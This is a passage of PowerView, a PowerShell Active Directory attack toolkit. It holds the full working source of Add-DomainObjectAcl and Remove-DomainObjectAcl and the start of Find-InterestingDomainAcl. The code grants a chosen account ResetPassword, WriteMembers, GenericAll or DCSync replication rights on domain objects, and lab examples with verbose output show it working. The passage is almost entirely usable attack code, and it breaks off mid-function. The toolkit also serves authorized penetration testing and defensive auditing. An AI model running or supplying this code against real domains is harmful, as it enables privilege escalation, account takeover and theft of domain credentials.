TargetLDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory object targets.\n\n.PARAMETER TargetSearchBase\n\nThe LDAP source to search through for targets, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER PrincipalIdentity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\nfor the domain principal to add for the ACL. Required. Wildcards accepted.\n\n.PARAMETER PrincipalDomain\n\nSpecifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.PARAMETER Rights\n\nRights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync'.\nDefaults to 'All'.\n\n.PARAMETER RightsGUID\n\nManual GUID representing the right to add to the target.\n\n.EXAMPLE\n\n$Harmj0ySid = Get-DomainUser harmj0y | Select-Object -ExpandProperty objectsid\nGet-DomainObjectACL dfm.a -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid}\n\n...\n\nAdd-DomainObjectAcl -TargetIdentity dfm.a -PrincipalIdentity harmj0y -Rights ResetPassword -Verbose\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\nVERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=harmj0y)))\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\nVERBOSE: [Get-DomainObject] Get-DomainObject filter string:(&(|(samAccountName=dfm.a)))\nVERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local 'ResetPassword' on CN=dfm (admin),CN=Users,DC=testlab,DC=local\nVERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID '00299570-246d-11d0-a768-00aa006e0529' on CN=dfm (admin),CN=Users,DC=testlab,DC=local\n\nGet-DomainObjectACL dfm.a -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid }\n\nAceQualifier           : AccessAllowed\nObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local\nActiveDirectoryRights  : ExtendedRight\nObjectAceType          : User-Force-Change-Password\nObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114\nInheritanceFlags       : None\nBinaryLength           : 56\nAceType                : AccessAllowedObject\nObjectAceFlags         : ObjectAceTypePresent\nIsCallback             : False\nPropagationFlags       : None\nSecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108\nAccessMask             : 256\nAuditFlags             : None\nIsInherited            : False\nAceFlags               : None\nInheritedObjectAceType : All\nOpaqueLength           : 0\n\n.EXAMPLE\n\n$Harmj0ySid = Get-DomainUser harmj0y | Select-Object -ExpandProperty objectsid\nGet-DomainObjectACL testuser -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid}\n\n[no results returned]\n\n$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nAdd-DomainObjectAcl -TargetIdentity testuser -PrincipalIdentity harmj0y -Rights ResetPassword -Credential $Cred -Verbose\nVERBOSE: [Get-Domain] Using alternate credentials for Get-Domain\nVERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\nVERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection\nVERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=harmj0y)(name=harmj0y))))\nVERBOSE: [Get-Domain] Using alternate credentials for Get-Domain\nVERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\nVERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection\nVERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=testuser)(name=testuser))))\nVERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local 'ResetPassword' on CN=testuser testuser,CN=Users,DC=testlab,DC=local\nVERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID '00299570-246d-11d0-a768-00aa006e0529' on CN=testuser,CN=Users,DC=testlab,DC=local\n\nGet-DomainObjectACL testuser -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid }\n\nAceQualifier           : AccessAllowed\nObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local\nActiveDirectoryRights  : ExtendedRight\nObjectAceType          : User-Force-Change-Password\nObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114\nInheritanceFlags       : None\nBinaryLength           : 56\nAceType                : AccessAllowedObject\nObjectAceFlags         : ObjectAceTypePresent\nIsCallback             : False\nPropagationFlags       : None\nSecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108\nAccessMask             : 256\nAuditFlags             : None\nIsInherited            : False\nAceFlags               : None\nInheritedObjectAceType : All\nOpaqueLength           : 0\n\n.LINK\n\nhttps://adsecurity.org/?p=1906\nhttps://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [CmdletBinding()]\n    Param (\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name')]\n        [String[]]\n        $TargetIdentity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $TargetDomain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $TargetLDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $TargetSearchBase,\n\n        [Parameter(Mandatory = $True)]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $PrincipalIdentity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $PrincipalDomain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]\n        [String]\n        $Rights = 'All',\n\n        [Guid]\n        $RightsGUID\n    )\n\n    BEGIN {\n        $TargetSearcherArguments = @{\n            'Properties' = 'distinguishedname'\n            'Raw' = $True\n        }\n        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }\n        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }\n        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }\n        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }\n\n        $PrincipalSearcherArguments = @{\n            'Identity' = $PrincipalIdentity\n            'Properties' = 'distinguishedname,objectsid'\n        }\n        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }\n        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }\n        $Principals = Get-DomainObject @PrincipalSearcherArguments\n        if (-not $Principals) {\n            throw \"Unable to resolve principal: $PrincipalIdentity\"\n        }\n    }\n\n    PROCESS {\n        $TargetSearcherArguments['Identity'] = $TargetIdentity\n        $Targets = Get-DomainObject @TargetSearcherArguments\n\n        ForEach ($TargetObject in $Targets) {\n\n            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'\n            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'\n            $ACEs = @()\n\n            if ($RightsGUID) {\n                $GUIDs = @($RightsGUID)\n            }\n            else {\n                $GUIDs = Switch ($Rights) {\n                    # ResetPassword doesn't need to know the user's current password\n                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }\n                    # allows for the modification of group membership\n                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }\n                    # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\n                    # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\n                    # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c\n                    #   when applied to a domain's ACL, allows for the use of DCSync\n                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}\n                }\n            }\n\n            ForEach ($PrincipalObject in $Principals) {\n                Write-Verbose \"[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname)\"\n\n                try {\n                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)\n\n                    if ($GUIDs) {\n                        ForEach ($GUID in $GUIDs) {\n                            $NewGUID = New-Object Guid $GUID\n                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'\n                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType\n                        }\n                    }\n                    else {\n                        # deault to GenericAll rights\n                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'\n                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType\n                    }\n\n                    # add all the new ACEs to the specified object directory entry\n                    ForEach ($ACE in $ACEs) {\n                        Write-Verbose \"[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)\"\n                        $TargetEntry = $TargetObject.GetDirectoryEntry()\n                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'\n                        $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n                        $TargetEntry.PsBase.CommitChanges()\n                    }\n                }\n                catch {\n                    Write-Verbose \"[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_\"\n                }\n            }\n        }\n    }\n}\n\n\nfunction Remove-DomainObjectAcl {\n<#\n.SYNOPSIS\n\nRemoves an ACL from a specific active directory object.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainObject  \n\n.DESCRIPTION\n\nThis function modifies the ACL/ACE entries for a given Active Directory\ntarget object specified by -TargetIdentity. Available -Rights are\n'All', 'ResetPassword', 'WriteMembers', 'DCSync', or a manual extended\nrights GUID can be set with -RightsGUID. These rights are removed from the target\nobject for the specified -PrincipalIdentity.\n\n.PARAMETER TargetIdentity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\nfor the domain object to modify ACLs for. Required. Wildcards accepted.\n\n.PARAMETER TargetDomain\n\nSpecifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.\n\n.PARAMETER TargetLDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory object targets.\n\n.PARAMETER TargetSearchBase\n\nThe LDAP source to search through for targets, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER PrincipalIdentity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\nfor the domain principal to add for the ACL. Required. Wildcards accepted.\n\n.PARAMETER PrincipalDomain\n\nSpecifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.PARAMETER Rights\n\nRights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync'.\nDefaults to 'All'.\n\n.PARAMETER RightsGUID\n\nManual GUID representing the right to add to the target.\n\n.EXAMPLE\n\n$UserSID = Get-DomainUser user | Select-Object -ExpandProperty objectsid\nGet-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID}\n\n[no results returned]\n\nAdd-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword\n\nGet-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID }\n\nAceQualifier           : AccessAllowed\nObjectDN               : CN=user2,CN=Users,DC=testlab,DC=local\nActiveDirectoryRights  : ExtendedRight\nObjectAceType          : User-Force-Change-Password\nObjectSID              : S-1-5-21-883232822-274137685-4173207997-2105\nInheritanceFlags       : None\nBinaryLength           : 56\nAceType                : AccessAllowedObject\nObjectAceFlags         : ObjectAceTypePresent\nIsCallback             : False\nPropagationFlags       : None\nSecurityIdentifier     : S-1-5-21-883232822-274137685-4173207997-2104\nAccessMask             : 256\nAuditFlags             : None\nIsInherited            : False\nAceFlags               : None\nInheritedObjectAceType : All\nOpaqueLength           : 0\n\n\nRemove-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword\n\nGet-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID}\n\n[no results returned]\n\n.LINK\n\nhttps://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [CmdletBinding()]\n    Param (\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name')]\n        [String[]]\n        $TargetIdentity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $TargetDomain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $TargetLDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $TargetSearchBase,\n\n        [Parameter(Mandatory = $True)]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $PrincipalIdentity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $PrincipalDomain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]\n        [String]\n        $Rights = 'All',\n\n        [Guid]\n        $RightsGUID\n    )\n\n    BEGIN {\n        $TargetSearcherArguments = @{\n            'Properties' = 'distinguishedname'\n            'Raw' = $True\n        }\n        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }\n        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }\n        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }\n        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }\n\n        $PrincipalSearcherArguments = @{\n            'Identity' = $PrincipalIdentity\n            'Properties' = 'distinguishedname,objectsid'\n        }\n        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }\n        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }\n        $Principals = Get-DomainObject @PrincipalSearcherArguments\n        if (-not $Principals) {\n            throw \"Unable to resolve principal: $PrincipalIdentity\"\n        }\n    }\n\n    PROCESS {\n        $TargetSearcherArguments['Identity'] = $TargetIdentity\n        $Targets = Get-DomainObject @TargetSearcherArguments\n\n        ForEach ($TargetObject in $Targets) {\n\n            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'\n            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'\n            $ACEs = @()\n\n            if ($RightsGUID) {\n                $GUIDs = @($RightsGUID)\n            }\n            else {\n                $GUIDs = Switch ($Rights) {\n                    # ResetPassword doesn't need to know the user's current password\n                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }\n                    # allows for the modification of group membership\n                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }\n                    # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\n                    # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\n                    # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c\n                    #   when applied to a domain's ACL, allows for the use of DCSync\n                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}\n                }\n            }\n\n            ForEach ($PrincipalObject in $Principals) {\n                Write-Verbose \"[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname)\"\n\n                try {\n                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)\n\n                    if ($GUIDs) {\n                        ForEach ($GUID in $GUIDs) {\n                            $NewGUID = New-Object Guid $GUID\n                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'\n                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType\n                        }\n                    }\n                    else {\n                        # deault to GenericAll rights\n                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'\n                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType\n                    }\n\n                    # remove all the specified ACEs from the specified object directory entry\n                    ForEach ($ACE in $ACEs) {\n                        Write-Verbose \"[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)\"\n                        $TargetEntry = $TargetObject.GetDirectoryEntry()\n                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'\n                        $TargetEntry.PsBase.ObjectSecurity.RemoveAccessRule($ACE)\n                        $TargetEntry.PsBase.CommitChanges()\n                    }\n                }\n                catch {\n                    Write-Verbose \"[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_\"\n                }\n            }\n        }\n    }\n}\n\n\nfunction Find-InterestingDomainAcl {\n<#\n.SYNOPSIS\n\nFinds object ACLs in the current (or specified) domain with modification\nrights set to non-built in objects.\n\nThanks Sean Metcalf (@pyrotek3) for the idea and guidance.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainObjectAcl, Get-DomainObject, Convert-ADName  \n\n.DESCRIPTION\n\nThis function enumerates the ACLs for every object in the domain with Get-DomainObjectAcl,\nand for each returned ACE entry it checks if principal security identifier\nis *-1000 (meaning the account is not built in), and also checks if the rights for\nthe ACE mean the object can be modified by the principal. If these conditions are met,\nthen the security identifier SID is translated, the domain object is retrieved, and\nadditional IdentityReference* information is appended to the output object.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER ResolveGUIDs\n\nSwitch. Resolve GUIDs to their display names.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nFind-InterestingDomainAcl\n\nFinds interesting object ACLS in the current domain.\n\n.EXAMPLE\n\nFind-InterestingDomainAcl -Domain dev.testlab.local -ResolveGUIDs\n\nFinds interesting object ACLS in the ev.testlab.local domain and\nresolves rights GUIDs to display names.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nFind-InterestingDomainAcl -Credential $Cred -ResolveGUIDs\n\n.OUTPUTS\n\nPowerView.ACL\n\nCustom PSObject with ACL entries.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.ACL')]\n    [CmdletBinding()]\n    Param (\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DomainName', 'Name')]\n        [String]\n        $Domain,\n\n        [Switch]\n        $ResolveGUIDs,\n\n        [String]\n        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]\n        $RightsFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $ACLArguments = @{}\n        if ($PSBoundParameters['ResolveGUIDs']) { $ACLArguments['ResolveGUIDs'] = $ResolveGUIDs }\n        if ($PSBoundParameters['RightsFilter']) { $ACLArguments['RightsFilter'] = $RightsFilter }\n        if ($PSBoundParameters['LDAPFilter']) { $ACLArguments['LDAPFilter'] = $LDAPFilter }\n        if ($PSBoundParameters['SearchBase']) { $ACLArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }\n\n        $ObjectSearcherArguments = @{\n            'Properties' = 'samaccountname,objectclass'\n            'Raw' = $True\n        }\n        if ($PSBoundParameters['Server']) { $ObjectSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $ObjectSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $ObjectSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $ObjectSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $ObjectSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $ObjectSearcherArguments['Credential'] = $Credential }\n\n        $ADNameArguments = @{}\n        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }\n        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }\n\n        # ongoing list of built-up SIDs\n        $ResolvedSIDs = @{}\n    }\n\n    PROCESS {\n        if ($PSBoundParameters['Domain']) {\n            $ACLArguments['Domain'] = $Domain\n            $ADNameArguments['Domain'] = $Domain\n        }\n\n        Get-DomainObjectAcl @ACLArguments | ForEach-Object {\n\n            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {\n                # only process SIDs > 1000\n                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\\d{3,}$') {\n                    if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {\n                        $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass = 